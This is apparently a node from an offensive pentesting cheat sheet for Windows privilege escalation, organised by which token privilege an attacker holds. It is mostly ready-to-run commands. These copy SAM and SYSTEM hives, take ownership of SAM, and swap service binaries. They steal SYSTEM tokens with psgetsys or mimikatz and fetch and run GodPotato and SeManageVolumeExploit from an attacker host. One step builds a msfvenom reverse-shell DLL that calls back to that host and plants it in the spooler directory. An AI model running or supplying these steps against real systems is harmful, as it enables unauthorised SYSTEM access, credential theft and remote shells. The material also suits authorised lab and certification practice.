title: Token Impersonation (Potato)
body: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = instant SYSTEM on almost every Windows version. No Metasploit needed.
cmd:
# ══ ⭐ WHICH PRIV DO YOU HAVE? — do exactly this ══════════════════════
# Run whoami /priv, find your line, do what it says. Disabled != absent
# (the tool enables it) — PRESENCE is what matters, not State.
#
#  SeImpersonate / SeAssignPrimaryToken → POTATO = instant SYSTEM  → potato_attacks
#  SeManageVolume   → SeManageVolumeExploit → C:\ write → plant DLL → SYSTEM  → se_managevolume
#  SeRestore        → write any file → service-binary swap / utilman / DLL → se_restore
#  SeBackup         → reg save SAM+SYSTEM → secretsdump                  (inline below)
#  SeTakeOwnership  → takeown SAM → read it                             (inline below)
#  SeDebug          → become SYSTEM or dump LSASS                       → se_debug
#  SeLoadDriver     → load a vulnerable signed driver (niche)           (inline below)
#  SeShutdown       → reboot to trigger an Auto service-binary hijack   (→ weak_service)
#
whoami /priv

# ── ACL TELL (feeds weak_service / task hijack) ──────
# When you icacls a binary, a permission with NO (I) prefix was set
# EXPLICITLY (on purpose):
#   BUILTIN\Users:(F)     <- explicit, deliberate misconfig = exploitable
#   BUILTIN\Users:(I)(F)  <- inherited from parent, less telling

# ══════════════════════════════════════════════════════
# INLINE EXPLOITS — the short ones (Potato has its own node)
# ══════════════════════════════════════════════════════

# ── SeBackupPrivilege → read any file → SYSTEM/DA ────
robocopy /B C:\Windows\System32\Config C:\Windows\Temp SAM SYSTEM   # local hashes
# ON A DC: DiskShadow → ntds.dit → every domain hash → DA. enable priv first.
# Full VSS/diskshadow/wmic detail + gotchas → se_backup.

# ── SeRestorePrivilege → write anywhere → SYSTEM ─────
# overwrite a SYSTEM service binary (headless) or swap cmd->utilman (RDP):
sc qc <svc> ; copy /y shell.exe "C:\Path\Service.exe" ; sc stop <svc> & sc start <svc>
# enable it first (Disabled by default). utilman swap, DLL route, DC ntds → se_restore.

# ── SeTakeOwnershipPrivilege → own then read SAM ─────
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant administrators:F

# ── SeDebugPrivilege → SYSTEM ────────────────────────
# steal a SYSTEM process's token (no mimikatz):  . .\psgetsys.ps1
ImpersonateFromParentPid -ppid <winlogon-pid> -command "cmd.exe" -cmdargs ""
# or mimikatz "privilege::debug" "token::elevate" "token::run /program:cmd.exe" "exit"
# LSASS dump (DA hash) + meterpreter-migrate + the PPL caveat → se_debug.

# ── SeManageVolumePrivilege → SYSTEM  (open System32 → plant DLL) ──
# 1) open System32 write (this exploit flips the C:\Windows ACL):
iwr http://$lhost/SeManageVolumeExploit.exe -OutFile smv.exe ; .\smv.exe   # "Entries changed... DONE"
# 2) (Kali) build a payload DLL:  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f dll -o Printconfig.dll
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll
# 3) (Kali) nc -nlvp 443, then trigger the Spooler (SYSTEM):
powershell -c "$t=[Type]::GetTypeFromCLSID('{854A20FB-2D44-457D-992F-EF13785D2B51}');[Activator]::CreateInstance($t)"
# → SYSTEM. All triggers (tzres=netsvc, WerTrigger/phoneinfo) + gotchas → se_managevolume.

# ── SeLoadDriverPrivilege (niche) ────────────────────
# Load a vulnerable signed driver (e.g. Capcom.sys) → SYSTEM. Rarely the
# intended OSCP path — check Potato and the other privs first.

# ── SeImpersonate / SeAssignPrimaryToken → SYSTEM ────
iwr http://$lhost/GodPotato-NET4.exe -OutFile gp.exe ; .\gp.exe -cmd "C:\Windows\Temp\shell.exe"   # instant SYSTEM
# GodPotato = most universal; other variants (Sigma/Print/Rogue/Juicy) → potato_attacks.

choices.label: SeManageVolume - open C:\ write -> System32 DLL hijack -> SYSTEM (Access chain)
SeBackup — read any file → SAM / ntds.dit → DA
